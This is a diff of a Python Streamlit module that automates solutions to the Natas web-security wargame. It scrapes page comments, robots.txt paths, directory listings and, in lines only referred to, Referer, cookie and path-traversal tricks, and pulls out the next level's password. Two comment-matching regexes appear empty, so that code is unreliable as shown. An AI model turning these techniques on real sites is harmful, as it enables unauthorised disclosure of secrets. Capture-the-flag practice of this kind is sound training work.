@@ -1,7 +1,7 @@
 import streamlit as st
 import re
 import base64
-from modules.utils import initialize_http_session
+from .utils import initialize_http_session
 
 def execute(level_name, context):
     st.markdown(f"### 📋 Running: {level_name}")
@@ -10,32 +10,9 @@ def execute(level_name, context):
     base_url = context['url'].rstrip('/')
     
     # =========================================================================
-    # LEVELS 0 & 1: Source Code Comment Scraping
-    # =========================================================================
-    if level_name in ["Level 0", "Level 1"]:
-        st.info(f"{level_name} selected: Scraping source comment arrays...")
-        try:
-            response = session.get(base_url, timeout=10)
-            if response.status_code == 200:
-                st.success("Successfully fetched page source.")
-                
-                # FIX: Added regex pattern to extract alphanumeric tokens (32-64 chars) inside HTML comments
-                all_tokens = re.findall(r'', response.text, re.DOTALL)
-                valid_tokens = [t for t in all_tokens if t != context['password']]
-                
-                if valid_tokens:
-                    next_lvl = int(level_name.split()[-1]) + 1
-                    st.success(f"🎯 Password for Level {next_lvl} captured!")
-                    st.code(f"Natas {next_lvl} Password: {valid_tokens[0]}")
-                else:
-                    st.warning("No password tokens found embedded inside source comments.")
-        except Exception as e:
-            st.error(f"Module execution failed: {str(e)}")
-
-    # =========================================================================
     # LEVEL 2: Directory Indexing File Disclosure
     # =========================================================================
-    elif level_name == "Level 2":
+    if level_name == "Level 2":
         st.info("Level 2 selected: Targeting the exposed directory indexing path...")
         target_directory_url = f"{base_url}/files/"
         try:
@@ -46,15 +23,20 @@ def execute(level_name, context):
                 
                 if file_match:
                     target_file = file_match.group(1)
+                    st.write(f"📂 Identified potentially sensitive file: `{target_file}`")
                     file_url = f"{target_directory_url}{target_file}"
                     file_response = session.get(file_url, timeout=10)
                     
-                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', file_response.text)
+                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', file_response.text)
                     valid_tokens = [t for t in all_tokens if t != context['password']]
                     
                     if valid_tokens:
                         st.success(f"🎯 Successfully extracted token for the next level!")
                         st.code(f"Natas 3 Password: {valid_tokens[0]}")
+                    else:
+                        st.warning("No new 32-character tokens found inside the target file.")
+                else:
+                    st.error("Could not find any text file links inside the directory listing.")
         except Exception as e:
             st.error(f"Module execution failed: {str(e)}")
 
@@ -62,22 +44,53 @@ def execute(level_name, context):
     # LEVEL 3: Information Disclosure via robots.txt
     # =========================================================================
     elif level_name == "Level 3":
-        st.info("Level 3 selected: Checking the `robots.txt` file...")
+        st.info("Level 3 selected: Checking the `robots.txt` file for hidden asset directories...")
         robots_url = f"{base_url}/robots.txt"
+        
         try:
+            # Step 1: Request the standard crawler configuration file
             robots_res = session.get(robots_url, timeout=10)
+            
             if robots_res.status_code == 200:
+                st.success("Successfully read `robots.txt` from server root.")
+                st.code(robots_res.text, language="text")
+                
+                # Step 2: Extract paths hidden behind the 'Disallow:' directive
                 hidden_paths = re.findall(r'Disallow:\s*([^\s\n]+)', robots_res.text)
+                
                 if hidden_paths:
+                    # Target the first disallowed directory path found
                     secret_dir = hidden_paths[0].strip('/')
+                    st.write(f"🔍 Discovered restricted directory path: `/{secret_dir}/`")
+                    
+                    # Step 3: Query the hidden directory index to check for files
                     secret_url = f"{base_url}/{secret_dir}/"
                     secret_res = session.get(secret_url, timeout=10)
                     
-                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', secret_res.text)
+                    # Step 4: Scan the resulting page or files for the 32-character credential string
+                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', secret_res.text)
+                    
+                    # Look deeper if the directory lists a specific text file (e.g., users.txt)
+                    file_match = re.search(r'href="([^"]+\.txt)"', secret_res.text)
+                    if file_match:
+                        specific_file_url = f"{secret_url}{file_match.group(1)}"
+                        specific_file_res = session.get(specific_file_url, timeout=10)
+                        all_tokens += re.findall(r'\b[A-Za-z0-9]{32}\b', specific_file_res.text)
+
+                    # Filter out the current active password to isolate the new target
                     valid_tokens = [t for t in all_tokens if t != context['password']]
+                    
                     if valid_tokens:
-                        st.success("🎯 Captured flag!")
+                        st.success("🎯 Successfully navigated directory exclusions and captured flag!")
                         st.code(f"Natas 4 Password: {valid_tokens[0]}")
+                    else:
+                        st.warning("Could not automatically locate a new token string in the secret folder.")
+                        with st.expander("View Raw Folder Content"):
+                            st.code(secret_res.text, language="html")
+                else:
+                    st.error("No entries found following the 'Disallow:' directive.")
+            else:
+                st.error(f"Could not retrieve robots.txt. Status: {robots_res.status_code}")
         except Exception as e:
             st.error(f"Module execution failed: {str(e)}")
 
@@ -98,6 +111,8 @@ def execute(level_name, context):
                 if valid_tokens:
                     st.success("🎯 Referer modification bypass verified!")
                     st.code(f"Natas 5 Password: {valid_tokens[0]}")
+            else:
+                st.error(f"Server rejected request or credentials invalid. Status code: {response.status_code}")
         except Exception as e:
             st.error(f"Module execution failed: {str(e)}")
 
@@ -115,6 +130,8 @@ def execute(level_name, context):
                 if valid_tokens:
                     st.success("🎯 Cookie parameter injection bypass verified!")
                     st.code(f"Natas 6 Password: {valid_tokens[0]}")
+            else:
+                st.error(f"Server verification failed. Status code: {response.status_code}")
         except Exception as e:
             st.error(f"Module execution failed: {str(e)}")
 
@@ -139,6 +156,8 @@ def execute(level_name, context):
                     if valid_tokens:
                         st.success("🎯 Form authentication successful!")
                         st.code(f"Natas 7 Password: {valid_tokens[0]}")
+            else:
+                st.error(f"Could not reach configuration includes. Status code: {include_response.status_code}")
         except Exception as e:
             st.error(f"Module execution failed: {str(e)}")
 
@@ -157,6 +176,8 @@ def execute(level_name, context):
                 if valid_tokens:
                     st.success("🎯 Path parameter traversal validated!")
                     st.code(f"Natas 8 Password: {valid_tokens[0]}")
+            else:
+                st.error(f"LFI inclusion request refused. Status code: {response.status_code}")
         except Exception as e:
             st.error(f"Module execution failed: {str(e)}")
 
@@ -283,15 +304,34 @@ def execute(level_name, context):
             st.error(f"Module execution failed: {str(e)}")                
 
     # =========================================================================
-    # FALLBACK ENGINE
+    # FALLBACK ENGINE (Handles Level 0 & Level 1)
     # =========================================================================
     else:
         st.info(f"Targeting baseline configuration content for generic processing...")
         try:
             response = session.get(base_url, timeout=10)
-            all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', response.text)
-            valid_tokens = [t for t in all_tokens if t != context['password']]
+            st.success("Handshake completed successfully.")
+            
+            # Step 1: Look for strings inside HTML comments (Fix for Level 0 & Level 1)
+            comments = re.findall(r'', response.text, re.DOTALL)
+            all_tokens = []
+            
+            for comment in comments:
+                all_tokens.extend(re.findall(r'[A-Za-z0-9]{32}', comment))
+            
+            # Step 2: Look for strings anywhere else in the visible raw source body fallback
+            all_tokens.extend(re.findall(r'\b[A-Za-z0-9]{32}\b', response.text))
+            
+            # Clean variations and filter out the current session's password token
+            current_password = str(context.get('password', '')).strip()
+            valid_tokens = [t for t in all_tokens if t != current_password]
+            
             if valid_tokens:
+                st.success("🎯 Valid password token isolated!")
                 st.code(f"Extracted Token: {valid_tokens[0]}")
+            else:
+                st.caption("No unique 32-character pattern found on primary viewport.")
+                with st.expander("Show Captured Server Document"):
+                    st.code(response.text, language="html")
         except Exception as e:
             st.error(f"Error executing fallback module: {str(e)}")
